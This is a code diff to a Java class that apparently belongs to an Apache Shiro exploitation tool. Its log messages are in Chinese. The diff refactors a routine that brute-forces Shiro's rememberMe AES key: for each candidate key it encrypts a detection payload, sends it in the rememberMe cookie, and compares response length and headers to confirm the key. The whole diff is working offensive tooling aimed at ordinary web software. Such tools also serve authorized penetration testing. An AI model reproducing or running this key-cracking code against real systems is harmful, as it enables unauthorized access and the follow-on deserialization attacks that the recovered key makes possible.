@@ -43,9 +43,10 @@ public class BurstJob implements Callable<String> {
         int errLen = 0;
         //默认存在 remember
         boolean isExistMB =true;
+        String rememberMe = paramsContext.get("rmeValue").toString();
 
         try {
-            Controller.logUtil.printInfoLog("开始爆破默认key");
+            Controller.logUtil.printInfoLog("开始爆破默认key",false);
 
             //错误包长度
             Map<String, Object> header = (Map<String, Object>)paramsContext.get("header");
@@ -56,11 +57,11 @@ public class BurstJob implements Callable<String> {
             //在原有cookie后面追加
             if (header.get("cookie")!=null){
                 oldCookie = header.get("cookie");
-                if (!header.get("cookie").toString().contains(paramsContext.get("rmeValue").toString())){
-                    header.put("cookie",oldCookie+";"+paramsContext.get("rmeValue")+"=123456");
+                if (!header.get("cookie").toString().contains(rememberMe)){
+                    header.put("cookie",oldCookie+";"+rememberMe+"=123456");
                 }
             }else {
-                header.put("cookie",paramsContext.get("rmeValue")+"=123456");
+                header.put("cookie",rememberMe+"=123456");
             }
 
 
@@ -70,7 +71,7 @@ public class BurstJob implements Callable<String> {
                 if (response!=null){
                    String data = EntityUtils.toString(response.getEntity(),"utf-8");
                    errLen = data.length();
-                   if (!Arrays.toString(response.getAllHeaders()).contains(paramsContext.get("rmeValue").toString())){
+                   if (!Arrays.toString(response.getAllHeaders()).contains(rememberMe)){
                        isExistMB = false;
                    }
                 }
@@ -81,33 +82,28 @@ public class BurstJob implements Callable<String> {
                 if (response!=null){
                     String data = EntityUtils.toString(response.getEntity(),"utf-8");
                     errLen = data.length();
-                    if (!Arrays.toString(response.getAllHeaders()).contains(paramsContext.get("rmeValue").toString())){
+                    if (!Arrays.toString(response.getAllHeaders()).contains(rememberMe)){
                         isExistMB = false;
                     }
                 }
-
             }
 
 
             int i=1;
             for (String key : keys) {
-                Controller.logUtil.printInfoLog(i+".检测"+key);
-                String encryptData="";
+                Controller.logUtil.printInfoLog(i+".检测"+key,false);
+                String encryptData;
                 if (paramsContext.get("AES").equals(Constants.AES_GCM)){
                     encryptData = PayloadEncryptTool.AesGcmEncrypt(ShiroTool.getDetectText(),key);
                 }else {
                     encryptData = PayloadEncryptTool.AesCbcEncrypt(ShiroTool.getDetectText(),key);
                 }
 
-                if (controller.isShowPayload.isSelected()){
-                    Controller.logUtil.printInfoLog(encryptData);
-                    Controller.logUtil.printInfoLog(encryptData.length()+"");
-                }
                 //请求包header超过8k会报header too large错误
                 if (oldCookie!=null){
-                    header.put("cookie",oldCookie+";"+paramsContext.get("rmeValue")+"="+encryptData);
+                    header.put("cookie",oldCookie+";"+rememberMe+"="+encryptData);
                 }else {
-                    header.put("cookie",paramsContext.get("rmeValue")+"="+encryptData);
+                    header.put("cookie",rememberMe+"="+encryptData);
                 }
 
                 //System.out.println(header.get("cookie"));
@@ -127,9 +123,19 @@ public class BurstJob implements Callable<String> {
                         data = EntityUtils.toString(response.getEntity(),"utf-8");
                     }
                 }
+
+                //输出详情
+                if (controller.isShowPayload.isSelected()){
+                    //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
+                    Controller.logUtil.printInfoLog(encryptData,false);
+                    Controller.logUtil.printInfoLog(""+resHeader,false);
+                }else {
+                    Controller.logUtil.getLog().selectPositionCaret(Controller.logUtil.getLog().getText().length());
+                }
+
                 //用长度进行第一次判断
                 if (data!=null&&errLen!=data.length()){
-                    if (isExistMB&&resHeader.contains(paramsContext.get("rmeValue").toString())){
+                    if (isExistMB&&resHeader.contains(rememberMe)){
                         Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                         controller.aesKey.setText(key);
                         break;
@@ -139,16 +145,16 @@ public class BurstJob implements Callable<String> {
                         break;
                     }
                 }else {
-                    if (isExistMB&&!resHeader.contains(paramsContext.get("rmeValue").toString())){
+                    if (isExistMB&&!resHeader.contains(rememberMe)){
                         Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                         controller.aesKey.setText(key);
                         break;
                     }
-                    Controller.logUtil.printAbortedLog("秘钥错误");
+                    Controller.logUtil.printAbortedLog("秘钥错误",false);
                 }
                 i++;
             }
-            Controller.logUtil.printAbortedLog("爆破结束！未发现默认秘钥！");
+            Controller.logUtil.printAbortedLog("爆破结束!",true);
         }catch (Exception e){
             e.printStackTrace();
         }finally {
